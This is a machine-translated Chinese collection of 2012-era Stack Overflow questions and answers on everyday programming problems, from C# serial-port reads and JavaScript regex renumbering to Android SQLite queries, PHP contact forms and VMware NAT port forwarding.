    我们在 Yandex 将 CSS 和 JavaScript 存储在同一个块文件夹中。因此，在 CSS 和 JavaScript 之间共享逻辑不是问题，因为它们都在一个地方。
    但是，如果您将 JavaScript 文件分开保存，这可能会影响支持共享逻辑的舒适程度。

等等...

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-30T18:13:37.037

我会选择第一个选项；毕竟你*是在切换状态，所以你需要相应地添加/删除/切换类。*这比撤消 CSS IMO 中的大量内容要好。

# c# - 我的 RS232 串行端口拆分我发送的输入

> ID：14074375
> 
> 赞同：0
> 
> 时间：2012-12-28T19:00:19.480
> 
> 标签：c#, serial-port

我有一个 USB 到 RS232 适配器，我用它从条形码阅读器获取长输入（28 个字符）。在我的电脑上一切正常。

我将我的 c# 应用程序安装在另一台 RS232 串行端口连接到其 PCI-E 的计算机上，当我接收到来自条形码阅读器的输入时，它将它分成两部分！

我怎么知道？因为我`DataReceived`在我的 c# 应用程序上有一个事件处理程序，它被调用了 2 次，每次我得到一部分输入。

RS232 PCI-E 端口由 Oxford Semiconductor Inc. 制造。

操作系统是 Windows 7。

我假设这是硬件问题，而不是我的应用程序中的问题。也许需要更改一些设置、缓冲区大小或类似的东西，但我找不到类似的东西。

先谢谢了！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-28T19:02:05.587

不，这是你的申请。您不应该期望所有数据都立即可用；你在第一台机器上很幸运。你需要打电话[`Read()`](http://msdn.microsoft.com/en-us/library/ms143549.aspx)，直到你得到你所期望的一切。

UART、驱动程序等方面的差异可能导致窗口多次引发该事件，具体取决于时间和其他因素。

这些方面的东西：

```
char buf[28];
int offset = 0;
int nread;
while (offset < buf.Length) {
    nread = comPort.Read(buf, offset, buf.Length - offset);
    offset += nread;
} 
```

# javascript - 正则表达式和 Javascript 从字符串中删除数字

> ID：14074376
> 
> 赞同：1
> 
> 时间：2012-12-28T19:00:20.580
> 
> 标签：javascript, regex, parsing

我有一个字符串：

```
 str =    'View:{
            Name:"View1",
            Image:{
                BackgroundImage:"Image.gif",
                Position: [0, 0],
                Width: 320,
                Height: 480
            },

            Button:{
                BackgroundImage:"Button.gif",
                Transition:"View2",
                Position: [49, 80],
                Width: 216,
                Height: 71
            },

            Button:{
                BackgroundImage:"Button2.gif",
                Position: [65, 217],
                Width: 188,
                Height: 134
            },' 
```

我使用此正则表达式将 '_#' 添加到末尾有 ':{' 的元素

```
var i = 0;
str = str.replace(/([^:]+):{/g, function(m, p1) { return p1 + "_" + (++i).toString() + ":{"; }); 
```

输出是

```
str =    'View_1:{
        Name:"View1",
        Image_2:{
            BackgroundImage:"Image.gif",
            Position: [0, 0],
            Width: 320,
            Height: 480
        },

        Button_3:{
            BackgroundImage:"Button.gif",
            Transition:"View2",
            Position: [49, 80],
            Width: 216,
            Height: 71
        },

        Button_4:{
            BackgroundImage:"Button2.gif",
            Position: [65, 217],
            Width: 188,
            Height: 134
        },' 
```

然后我用它做了一堆东西，现在我需要从中去掉' *#'。我将如何删除那些'* #'

没有必要，但我遇到的另一个问题是第一个正则表达式从 0 开始递增，并为每个元素提供下一个递增的数字。我正在尝试使每个元素在其类型上递增。像这样：

```
str =    'View_1:{
        Name:"View1",
        Image_1:{
            BackgroundImage:"Image.gif",
            Position: [0, 0],
            Width: 320,
            Height: 480
        },

        Button_1:{
            BackgroundImage:"Button.gif",
            Transition:"View2",
            Position: [49, 80],
            Width: 216,
            Height: 71
        },

        Button_2:{
            BackgroundImage:"Button2.gif",
            Position: [65, 217],
            Width: 188,
            Height: 134
        },' 
```

关于我在这里做错了什么的任何意见？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:03:40.850

对于第一个问题，只需替换`_\d+:{`为`:{`

其次，您需要为每种类型设置一个单独的计数器。尝试这个：

```
var i = {};
str = str.replace(/([^:]+):{/g, function(m, p1) {
    i[p1] = (i[p1] || 0)+1;
    return p1 + "_" + i[p1].toString() + ":{";
}); 
```

# java - Java，JDBC：尝试从数据库中检索对象时出现 StreamCorruptedException

> ID：14074377
> 
> 赞同：-1
> 
> 时间：2012-12-28T19:00:25.820
> 
> 标签：java, jdbc

我在从数据库中正确检索我自己的类“BallotPaper”的特定对象时遇到问题。它可以正确保存，但在创建 ObjectInputStream 时会引发异常。

当然，我在这里阅读了许多类似的问题和答案，但仍然无法处理。

在数据库中，我有一个包含 bytea 类型列（它是 postgreSQL）的表，我在其中保存我的对象。

下面是几行代码：

```
//Saving the object 'paper' of the class 'BallotPaper'
    PreparedStatement st = connection.prepareStatement(query);
    ByteArrayOutputStream byos = new ByteArrayOutputStream();
    ObjectOutputStream oos = new ObjectOutputStream(byos);
    oos.writeObject(paper);
    byte[] bytePaper = byos.toByteArray();
    st.setBytes(1, bytePaper);
    st.executeUpdate();

    byos.close();
    oos.close();
    st.close(); 

//Trying to retrieve the object:
    String query2 = "SELECT paper FROM voters WHERE id="+_id+";";
    Statement s = connection.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_READ_ONLY);
    ResultSet r = s.executeQuery(query2);
    r.first();
    bytePaper = r.getBytes(1);
    ByteArrayInputStream b = new ByteArrayInputStream(bytePaper);
    ObjectInputStream o = new ObjectInputStream(b); // *
    BallotPaper ba = (BallotPaper)o.readObject(); 
```

异常在最后一行抛出，标有 * 。

它看起来像这样：

```
java.io.StreamCorruptedException: invalid stream header: BB656430
at java.io.ObjectInputStream.readStreamHeader(Unknown Source)
at java.io.ObjectInputStream.<init>(Unknown Source)
at slave.VotersDB.saveFilledPaper(VotersDB.java:162)
at slave.ClientThread.prepareResponse(ClientThread.java:50)
at slave.ClientThread.run(ClientThread.java:72)
at java.util.concurrent.ThreadPoolExecutor.runWorker(Unknown Source)
at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)
at java.lang.Thread.run(Unknown Source) 
```

感谢您的所有回答。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T19:13:09.090

添加一个`flush()`：

```
oos.writeObject(paper);
oos.flush();
byte[] bytePaper = byos.toByteArray(); 
```

`ObjectOutputStream`允许缓冲其输出。您也可以调用`close()`而不是调用`flush()`，这至少可以清楚地表明您不应该再次使用流。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-29T10:00:40.810

我终于设法解决了这个问题。结果证明不适合使用 setBytes() 方法保存二进制数据。相反，应该使用 setBinaryStream()。

使用第一种方法，序列化对象的字节与原来的完全不同。有人知道为什么吗？

这是正确的代码：

```
PreparedStatement st = connection.prepareStatement(query);    

ByteArrayOutputStream baos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(baos);
oos.writeObject(paper); 
byte[] bytePaper = baos.toByteArray();

PipedInputStream pis = new PipedInputStream();
PipedOutputStream pos = new PipedOutputStream(pis);
pos.write(bytePaper);   
pos.flush();

st.setBinaryStream(1, pis,bytePaper.length); 
```

检索方式没有改变。

# javafx - javafx scene.lookup

> ID：14074381
> 
> 赞同：1
> 
> 时间：2012-12-28T19:00:53.250
> 
> 标签：javafx, scenegraph

我正在将现有的 Swing 应用程序转换为 JavaFX。我认为这段代码会返回一个名为“#paneRightBottom”的节点，但它返回 null。使用 netbeans 调试器，我可以深入“topNode”并找到“#paneRightBottom”节点六层深，所以它就在那里。我已经阅读了在线文档，并认为我应该得到一个节点。有谁知道我哪里出错了？

```
 Node topNode = FXMLLoader.load(AFI.class.getResource("afimain.fxml"));
        System.out.println(topNode.getId());
        Node node = topNode.lookup("#paneRightBottom"); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-28T20:49:52.733

检查您尝试查找的节点是否具有`id="paneRightBottom"`和不`fx:id="paneRightBottom"`。如果它也通过发布您的 fxml 文件来提供更多详细信息。

# php - 如果在验证联系表时出现任何错误，应出现警告消息框

> ID：14074384
> 
> 赞同：1
> 
> 时间：2012-12-28T19:01:02.287
> 
> 标签：php, html, web, contact-form

如果在提交表单时出现以下任何错误，应该会出现一个警告框。如果表单提交正确，还应该出现一个消息框。当发生任何错误时，现有代码会将我带到其他页面。并在提交表单时将我带到另一个页面。我需要消息框来显示根据下面给出的代码发生的错误。

下面是我的 PHP 代码

```
<?php
if(isset($_POST['Email'])) {

    // CHANGE THE TWO LINES BELOW
    $email_to = "jay44556677@gmail.com";

    $email_subject = "website html form submissions";

    function died($error) {
        // your error code can go here
        echo "We're sorry, but there's errors found with the form you submitted.<br /><br />";
        echo $error."<br /><br />";
        echo "Please go back and fix these errors.<br /><br />";
        die();
    }

    // validation expected data exists
    if(!isset($_POST['Name']) ||
        //!isset($_POST['last_name']) ||
        !isset($_POST['Email']) ||
        //!isset($_POST['telephone']) ||
        !isset($_POST['Message'])) {
        died('We are sorry, but there appears to be a problem with the form you submitted.');       
    }

    $first_name = $_POST['Name']; // required
    //$last_name = $_POST['last_name']; // required
    $email_from = $_POST['Email']; // required
    //$telephone = $_POST['telephone']; // not required
    $comments = $_POST['Message']; // required

    $error_message = "";
    $email_exp = '/^[A-Za-z0-9._%-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}$/';
  if(!preg_match($email_exp,$email_from)) {
    $error_message .= 'The Email Address you entered does not appear to be valid.<br />';
  }
    $string_exp = "/^[A-Za-z .'-]+$/";
  if(!preg_match($string_exp,$first_name)) {
    $error_message .= 'The First Name you entered does not appear to be valid.<br />';
  }
  //if(!preg_match($string_exp,$last_name)) {
    //$error_message .= 'The Last Name you entered does not appear to be valid.<br />';
  //}
  if(strlen($comments) < 2) {
    $error_message .= 'The Comments you entered do not appear to be valid.<br />';
  }
  if(strlen($error_message) > 0) {
    died($error_message);
  }
    $email_message = "Form details below.\n\n";

    function clean_string($string) {
      $bad = array("content-type","bcc:","to:","cc:","href");
      return str_replace($bad,"",$string);
    }

    $email_message .= "Name: ".clean_string($first_name)."\n";
    //$email_message .= "Last Name: ".clean_string($last_name)."\n";
    $email_message .= "Email: ".clean_string($email_from)."\n";
    //$email_message .= "Telephone: ".clean_string($telephone)."\n";
    $email_message .= "Comments: ".clean_string($comments)."\n";

// create email headers
$headers = 'From: '.$email_from."\r\n".
'Reply-To: '.$email_from."\r\n" .
'X-Mailer: PHP/' . phpversion();
@mail($email_to, $email_subject, $email_message, $headers);  
?>

<!-- place your own success html below -->

Thank you for contacting us. We will be in touch with you very soon.

<?php
}
die();
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T19:47:11.307

有几种方法 - ajax（正如 Barmar 建议的那样）或只是在按钮单击（`onClick()`）上调用的常规 javascript 函数。

如果您选择第一种方法，您可以在此处或 Internet 上的其他地方找到大量脚本示例。如果您选择后一种方法，则不要使用`<input type="submit" />`but `<input type="button" onclick="yourfunction();return false" />`。最后一位（返回 false）实际上非常重要。除其他外，您可以查看[此主题](https://stackoverflow.com/questions/1182755/stop-submit-with-empty-input-values)；它可能会给你一些进一步的想法。

# matlab - 如何绘制以下值

> ID：14074385
> 
> 赞同：-2
> 
> 时间：2012-12-28T19:01:06.513
> 
> 标签：matlab

想象 t 在 xx 中

```
 t: |0.2 |0.4 |0.6 |0.8 |1.0 |1.2 |1.4  |1.6 |1.8  |2.0
first function   |    |    |    |    |    |     |    |     |
         y1:|2.0 |1.7 |1.4 |1.2 |1   |0.8 |0.7  |0.6 |0.5  |0.4
second function  |    |    |    |    |    |     |    |     |
         y2:|3.0 |2.9 |2.8 |2.8 |2.8 |2.8 |2.8| |2.9 |2.9  |3 
```

想象一下 y1 和 y2 是带有来自这两个函数的图像的向量。如何以颜色和线条中的特定图案绘制它们？

另外，我如何制作两个单独的图表：一个用于 y1 ，另一个用于 y2 ？

先感谢您

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T19:24:14.760

将`plot`命令与 一起使用`hold on`以使两个图都在同一个图形上

```
figure
hold on
plot(t,y1,'ro-')
plot(t,y2,'g+:') 
```

您可能希望通过阅读有关绘图 ( `help plot`) 的帮助来查看其他颜色、线条样式和标记。

如果您想要两个单独的图，请执行以下操作：

```
figure
plot(t,y1,'ro-')
figure
plot(t,y2,'g+:') 
```

# c++ - 如何制作一个在 C++ 中执行一次的无限循环

> ID：14074388
> 
> 赞同：2
> 
> 时间：2012-12-28T19:01:12.697
> 
> 标签：c++, loops

我正在用 C++ 创建一个游戏。我目前的目标是在一个永远循环中检查玩家的健康状况，以检查他是否已经死亡。当他在的时候，我想让它知道<<你已经死了。但由于 cout << 在 while 语句中，一直在检查健康状况，结果输出并执行 cout << 多次。我希望它在循环中永远检查健康状况，如果健康状况 < 1，我希望它 cout << "You are dead"; 只有一次。有没有办法告诉 while 语句只执行一次？这是我当前的 while 语句：

```
bool gamerunning = true;

while (gamerunning == true) //While game is running...
{
if (health < 1) //If player is dead...
{
cout << "You are dead";
}
} 
```

执行此代码会多次输出“你死了”。我希望它继续检查此循环中的运行状况，但我希望 cout 执行一次，因此它不会一遍又一遍地重复相同的消息。如果您能提供一个小例子来说明如何阻止这种情况，我们将不胜感激。非常感谢你们！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T19:04:46.817

听起来你想在玩家死亡时停止游戏运行，在这种情况下你想要这样：

```
while (gamerunning == true) //While game is running...
{
  if (health < 1) //If player is dead...
  {
    cout << "You are dead";
    gamerunning = false;
  }
} 
```

如果没有，那么您可以保留另一个`bool`说明是否发生了死亡输出：

```
bool deadOutput = false;
while (gamerunning == true) //While game is running...
{
  if (health < 1 && !deadOutput) //If player is dead...
  {
    cout << "You are dead";
    deadOutput = true;
  }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-28T19:06:18.453

为什么不这样呢？

```
bool gamerunning = true;

while (gamerunning == true) //While game is running...
{
   if (health < 1) break
}
cout << "You are dead"; 
```

如果你想保持你的循环，你可以添加额外的布尔变量 - userDead，只有当 userDead 为 false 时才进行检查，并且在写入输出后你可以将其设置为 true。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-28T19:04:40.880

这个怎么样？

```
bool gamerunning = true;
bool output_done = false;

while (gamerunning == true) //While game is running...
{
    if ((health < 1) && (output_done != true)) //If player is dead...
    {
        cout << "You are dead";
        output_done = true;
    }
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-28T19:05:52.687

您可以使用 a`bool`来跟踪它是否已经发生：

```
bool gamerunning = true;
bool printed = false;

while (gamerunning == true) //While game is running...
{
    if (health < 1) //If player is dead...
    {
        if (!printed) {
            cout << "You are dead";
            printed = true;
        }
    }
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-28T19:06:26.803

```
bool gamerunning = true;

while (gamerunning == true) //While game is running...
{
    if (health < 1) //If player is dead...
    {
         cout << "You are dead";
         break;
    }
} 
```

或者

```
bool gamerunning = true;

while (gamerunning == true) //While game is running...
{
    if (health < 1) //If player is dead...
    {
         cout << "You are dead";
         gamerunning = false;
    }
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-28T19:07:12.560

```
bool gamerunning = true;
bool playerDead = false

while (gamerunning == true) //While game is running...
{
    if (health < 1) //If player is dead...
    {
       if (!playerDead) 
       {
           cout << "You are dead";
           playerDead = true;
       }
    }
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-12-28T19:04:43.397

通常你会有一个状态机..但一个简单的方法是跟踪..

`bool gamerunning = true; bool alive = true;`

 ````
while (gamerunning == true) //While game is running...
{
   if (health < 1 && alive) //If player is dead...
   {
      alive = false;
      cout << "You are dead";
   }
} 
````

# android - Android Sqlite 查询返回 null

> ID：14074389
> 
> 赞同：0
> 
> 时间：2012-12-28T19:01:31.487
> 
> 标签：android, android-sqlite

我在 Android 中有一个静态 sqlite 数据库。函数接受 int 类型的输入并对数据库进行查询。输入值为 97,500 时它工作正常，但如果我输入更大的值，则会发生两种情况之一

1.  如果输入为 98,000-99,500，则返回 null
2.  如果输入大于 100,000，则返回错误数据

这是发生故障的功能：

```
 Budget getBudget(int income,String name)
{
    Budget B=null;
    Log.d("DB", String.valueOf(income));
    try{
        SQLiteDatabase db=this.getReadableDatabase();
        Cursor cur=db.rawQuery("SELECT * FROM "+BudgetTable+" WHERE "+Low+"<=? AND "+High+">=?", new String[]{String.valueOf(income),String.valueOf(income)});
        Log.d("DB", String.valueOf(cur.getCount()));
        if(cur.getCount()!=0)
        {
            Log.d("DB", "Cursor not empty");
            cur.moveToFirst();
            B=new Budget(0, income,cur.getInt(cur.getColumnIndex(MortgageRent)),cur.getInt(cur.getColumnIndex(Utilities)) , 
                    cur.getInt(cur.getColumnIndex(LightnPower)), cur.getInt(cur.getColumnIndex(PhonenInternet)), 
                    cur.getInt(cur.getColumnIndex(HomeMaintenance)), cur.getInt(cur.getColumnIndex(HomeCleaning)), 
                    cur.getInt(cur.getColumnIndex(Groceries)), cur.getInt(cur.getColumnIndex(Clothing)),0, 
                    cur.getInt(cur.getColumnIndex(PersonalGrooming)), cur.getInt(cur.getColumnIndex(MedicalnPharmacy)), 
                    cur.getInt(cur.getColumnIndex(HealthInsurance)), cur.getInt(cur.getColumnIndex(LifeInsurance)), 
                    cur.getInt(cur.getColumnIndex(HomeInsurance)), cur.getInt(cur.getColumnIndex(Accounting)), 
                    cur.getInt(cur.getColumnIndex(BankFees)), cur.getInt(cur.getColumnIndex(Fuel)), 
                    cur.getInt(cur.getColumnIndex(ServicenRepairs)), cur.getInt(cur.getColumnIndex(GovernmentCharges)), 
                    cur.getInt(cur.getColumnIndex(CarInsurance)),0, cur.getInt(cur.getColumnIndex(PublicTransport)), 
                    cur.getInt(cur.getColumnIndex(Entertainment)), cur.getInt(cur.getColumnIndex(SportsnGym)),
                    cur.getInt(cur.getColumnIndex(EatOut)), cur.getInt(cur.getColumnIndex(Alcohol)), 
                    cur.getInt(cur.getColumnIndex(Gifts)), cur.getInt(cur.getColumnIndex(Holidays)), 
                    cur.getInt(cur.getColumnIndex(NewspapernMagazine)), cur.getInt(cur.getColumnIndex(Others)), 0, 0, name);

            Log.d("DB", String.valueOf(cur.getInt(cur.getColumnIndex(IncomeLevel))));
            cur.close();
            db.close();

        }
    }catch(Exception ex)
    {
        Log.d("DB", ex.getMessage());
    }
    return B;
} 
```

下面是数据库中数据的屏幕截图...我不知道为什么它不起作用。 ![这是数据库中数据的屏幕截图](../Images/3aa60fceda4760bf7c88306e4e049c15.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T19:12:58.077

由于我看不到您的数据库，因此我相信您的问题的根源是这一行：

```
Cursor cur=db.rawQuery("SELECT * FROM "+BudgetTable+" WHERE "+Low+"<=? AND "+High+">=?", new String[]{String.valueOf(income),String.valueOf(income)}); 
```

特别是您同时使用`income`大于等于和小于等于的事实。你确定这是你想要的吗？你确定这不是杯具吗？

```
Cursor cur=db.rawQuery("SELECT * FROM "+BudgetTable+" WHERE "+Low+"<=? AND "+High+">=?", new String[]{String.valueOf(lowIncome),String.valueOf(highIncome)}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T19:16:56.613

您不应该将数字作为字符串传递，因为字符串具有不同的比较规则，例如，字符串“2000”将被认为大于字符串“102500”。

他们在 javadoc 文档中对此提出警告：

> selectionArgs 您可以在查询的 where 子句中包含 ?s，它将被 selectionArgs 中的值替换。这些值将绑定为字符串。

您应该像这样重写您的查询：

```
Cursor cur=db.rawQuery("SELECT * FROM "+BudgetTable+
                      " WHERE "+Low+"<=" + income + " AND "+High+">=" + income); 
```

此外，这是一个很常见的问题，有些人遇到了类似的问题：[SQLite rawQuery selectionArgs and Integers Fields](https://stackoverflow.com/questions/11320434/sqlite-rawquery-selectionargs-and-integers-fields)

# amazon-s3 - 是否可以在 Amazon S3 上托管基于 Sencha 的移动网站？

> ID：14074391
> 
> 赞同：0
> 
> 时间：2012-12-28T19:01:39.720
> 
> 标签：amazon-s3, sencha-touch, sencha-touch-2

Amazon S3 静态网站托管听起来很诱人——使用简单、可靠且价格合适。

但是，到目前为止，我所阅读的所有内容都在谈论“静态”网站。似乎静态它们意味着没有服务器端处理。Sencha 框架似乎符合要求，因为它是纯 JS 框架。

鉴于所有网站资产都将在 S3 上，并且不需要服务器端处理（联系表格将提交到不同的服务器），一个功能齐全的 Sencha 移动网站可以在 S3 上运行吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T19:31:04.143

我相信它会出于您提到的相同原因而起作用……而且正如您所说，它非常便宜，因此试一试几乎没有风险。

# angularjs - 指令 - 从控制器初始化 ngModel

> ID：14074392
> 
> 赞同：0
> 
> 时间：2012-12-28T19:01:39.817
> 
> 标签：angularjs

为什么 ngModel 没有从 Controller 设置初始值？

示例： http: [//plnkr.co/edit/sGFv4zpVtvpsmUx1c9F3](http://plnkr.co/edit/sGFv4zpVtvpsmUx1c9F3)

```
 angular.module('customControl', [])
  .directive('contenteditable', function() {
    return {
      restrict: 'A', // only activate on element attribute
      require: '?ngModel', // get a hold of NgModelController
      link: function(scope, element, attrs, ngModel) {
        if(!ngModel) return; // do nothing if no ng-model

        // Specify how UI should be updated
        ngModel.$render = function() {
          element.html(ngModel.$viewValue || '');
        };
      }
    };
  });

  function TestCtrl($scope) {
    $scope.userContent = 'It Works!!!!';
  } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T19:22:21.777

您为模块命名为“customController”，因此您还必须为 ng-app 命名。

改变`<html ng-app>`

到

`<html ng-app="customControl">`

它应该可以解决您的问题。

工作示例： http: [//plnkr.co/edit/bVYavNKuwV9BjrDNz2Hm](http://plnkr.co/edit/bVYavNKuwV9BjrDNz2Hm)

# php - 可以从对象中使用 spl_autoload_register 吗？

> ID：14074393
> 
> 赞同：1
> 
> 时间：2012-12-28T19:01:41.817
> 
> 标签：php, spl-autoload-register

简单的问题，但我不知道这是否真的可能..

例子：

类测试有一个像这样的 spl_autoload_register：

```
function __construct() {
spl_autoload_register(function ($class) {
        echo "{$this->projectroot}/include/{$class}.php";
        require_once(strtolower("{$this->projectroot}/classes/{$class}.php"));
});
} 
```

$projectroot 是一个对象范围变量，带有项目目录的路径。

我在我的项目中包含类测试，从中创建一个新实例：

```
$test = new test(); 
```

现在我希望 $test 在创建时加载一个带有函数的类文件：

```
$test2 = new test2(); 
```

其中 test2 是 /include/test2.php 中名为 test2 的类。

当我尝试这样做时，它给了我一个错误说：

```
Fatal error: Using $this when not in object context in 
```

但是当我尝试时：

```
$test2 = new $test1->test2(); 
```

它完全忽略了 test1 中的 spl_autoload_register 函数：/ 只是说明显然 test2 不是已知方法（未定义的属性）。

有没有办法在我的项目的类测试中使用 spl_autoload_register 函数，而无需在我的主项目中进一步定义它？

**编辑**

我使用全局变量“修复”了它，但我很好奇是否有一些 OOP 方法？（并不是说这是实用/最佳实践 OOP 使用...）只是好奇。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-28T19:46:46.750

您可以将任何可调用对象注册为参数。

```
spl_autoload_register( array( $object, 'public function name'));

spl_autoload_register( 'classname::static_method'); 
```

应该有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T20:16:42.843

引用对该问题的反应：在 PHP 5.4 中，您可以在这样的闭包中使用 $this。

这大概就是答案。

# palindrome - 创建在线回文

> ID：14074400
> 
> 赞同：-1
> 
> 时间：2012-12-28T19:02:09.943
> 
> 标签：palindrome

我正在尝试创建一个在线回文传感器（字母表由 0、1、2、3、...9 组成）。代码如下：

```
#include<iostream>
#include<cmath>
using namespace std;

int main()
{
int x=0;
int y=0;

int c;
int i=0;
while(1)
{
cin>>c;
//I keep a track of previous number in x and its reverse in y and use them to create the 
//the new number and reverse at every input. Then I compare x and y. If equal the number is
//a palindrome.
/*eg:(When 121 is entered digit by digit)
  i=0:-
  x=10*0+1    y=0+ 10^0 *1 

  i=1:-
  x=10*1+2    y=1+ 10^1 *2

  i=2:-
  x=10*12+1   y=21+ 10^2 *1
*/
x=10*x+c;
y=y+ static_cast<int>(pow(10.0,static_cast<double>(i)) *c);
cout<<"y= "<<y<<" and "<<"x= "<<x<<endl;
if(y==x)
cout<<"Palindrome"<<endl;

i++;
}    

return 0;
} 
```

首先，我输入 1，它被指示为回文（如预期的那样）。然后，我输入 2 并没有发生任何事情（如预期的那样，`'y= 21 and x= 12'`被打印）。但是，然后我再次输入 1，这一次也没有发生任何事情（**不像预期的那样**），这被打印出来了：

```
y= 120 and x= 121 
```

谁能告诉我，本来应该是 121 的你是怎么变成 120 的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T20:32:16.113

你做的数学太多了：

```
public static boolean isPalindrom(char[] word){
    int i1 = 0;
    int i2 = word.length - 1;
    while (i2 > i1) {
        if (word[i1] != word[i2]) {
            return false;
        }
        ++i1;
        --i2;
    }
    return true;
} 
```

您需要做的就是在用户输入值时用值填充数组并调用与此类似的函数。当存在更简单的解决方案时，使用指数是一种巨大的资源浪费。

# android - Android：文字颜色全息灯

> ID：14074401
> 
> 赞同：5
> 
> 时间：2012-12-28T19:02:13.420
> 
> 标签：android, listview, themes

我只是有一个愚蠢的问题......我在我的应用程序中使用（或者更好，我想使用）主题全息灯：我已在清单文件中设置它。看下面的截图：文字太浅了吧？好的，我知道我可以设置它，但我的问题是：它是全息主题中的真实文本颜色还是我的应用程序中有错误？我想是因为奇怪的是在谷歌中选择了这样一种难以辨认的颜色。

![在此处输入图像描述](../Images/4a53e92ac47f99a57226731a00b2ebc3.png)

编辑：

我用属性设置主题

```
android:theme="@android:style/Theme.Holo.Light" 
```

的应用程序元素。这是我用 listfragment 填充的 listview 代码：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/songsLayout"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:gravity="left"
    android:orientation="vertical"
    android:padding="12dp" >

    <ListView
        android:id="@id/android:list"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:fastScrollEnabled="true"
        android:scrollbarStyle="insideInset"
        android:textFilterEnabled="false"/>

    <TextView
        android:id="@+id/songsFragment_titleTextView"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:paddingTop="7dp"
        android:paddingBottom="0dp"
        android:textSize="18sp"
        android:lines="1">
    </TextView>

    <TextView
        android:id="@+id/songsFragment_artistTextView"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:paddingBottom="7dp"
        android:paddingTop="0dp"
        android:lines="1" 
        android:textSize="14sp">

    </TextView>

</LinearLayout> 
```

希望你能帮我 ：）

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-03-19T22:28:45.677

创建适配器时，您使用的是应用程序上下文还是活动？我刚刚遇到了完全相同的问题，但注意到如果我生成了这样的阵列适配器：

```
ArrayAdapter<String> listAdapter = new ArrayAdapter<String>(getApplicationContext(),
                    android.R.layout.simple_list_item_1, tables);
            setListAdapter(listAdapter); 
```

然后文本显示为白色。但是，如果我使用了活动上下文（所以如果我在 onCreate 方法中执行上述操作，我可以只使用“this”），则文本是黑色的。我认为我的应用程序以某种方式覆盖了主题。也许那是/也是你的问题？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T20:09:13.507

看起来好像您正在选择默认主题，其默认文本颜色为#bfbfbf。我的猜测是您在 2.x 版本的 Android 上运行该应用程序，该版本没有安装 Holo light 主题。

# styles - 必须声明元素类型“conditionalStyle” - 添加新样式后出错

> ID：14074406
> 
> 赞同：0
> 
> 时间：2012-12-28T19:02:33.907
> 
> 标签：styles, jasper-reports

我在*jrtx*文件中添加了新样式：

```
<style name="BackgroundStyle" mode="Opaque" backcolor="gray">
  <conditionalStyle>
    <conditionExpression>Boolean.valueOf($V{REPORT_COUNT}.intValue() % 2 == 0)</conditionExpression>
    <style backcolor="lightGray"/>
  </conditionalStyle>
</style> 
```

在我看到的报告错误中 -**原因：org.xml.sax.SAXParseException：必须声明元素类型“conditionalStyle”。**

请帮我修一下

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T11:31:26.713

问题是 Jasper 中的约束不使用带有模板选项的条件样式解决方案在样式直接而不是在模板中使用它

# vmware - 使用 VMWare Player 5，如何通过外部机器访问在 VM 中运行的 Web 服务器？

> ID：14074408
> 
> 赞同：12
> 
> 时间：2012-12-28T19:02:46.980
> 
> 标签：vmware, vmware-player

通过 VMWare Player 在 Ubuntu VM 中运行 Rails 的 Win7 PC。我在一个网站上工作，想把它展示给我网络之外的朋友。

我发现这篇博文让我非常接近：[http ://blog.fardad.com/2012/06/vmware-player-and-custom-nat-port-map.html](http://blog.fardad.com/2012/06/vmware-player-and-custom-nat-port-map.html)

好的，所以我有使用 NAT 的虚拟机。据我了解，这意味着虚拟机似乎与外部流量的父计算机具有相同的 IP 地址。

我进入了 NAT 设置并添加了端口转发：

```
Host Port: 8200 Type: UDP Virtual IP Address: 192.168.198.184:3000 
```

好的，所以我的理解是我现在应该能够访问 192.168.1.1xx:8200（我的“真实”PC 的 IP）并访问在 VM 中运行的网络服务器。但是当我去那个地址时，我什么也得不到。我可以从 PC ping 192.168.198.184（虚拟机）。

我想要做的是进入我的路由器并设置一个最终将转发到 VM 的端口。

好像我错过了一些非常小的东西，但我不知道那是什么。请帮忙。

* * *

如果有人好奇如何获得虚拟网络编辑器：

> 转到 vmware 目录并在提升的 cmd.exe-box 中运行
> 
> rundll32.exe vmnetui.dll VMNetUI_ShowStandalone
> 
> [http://communities.vmware.com/message/2155960#2155960](http://communities.vmware.com/message/2155960#2155960)

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2014-09-03T07:48:57.093

1.  查找`vmnetnat.conf`文件，通常位于

    ```
    C:\ProgramData\VMware\vmnetnat.conf 
    ```

    或者

    ```
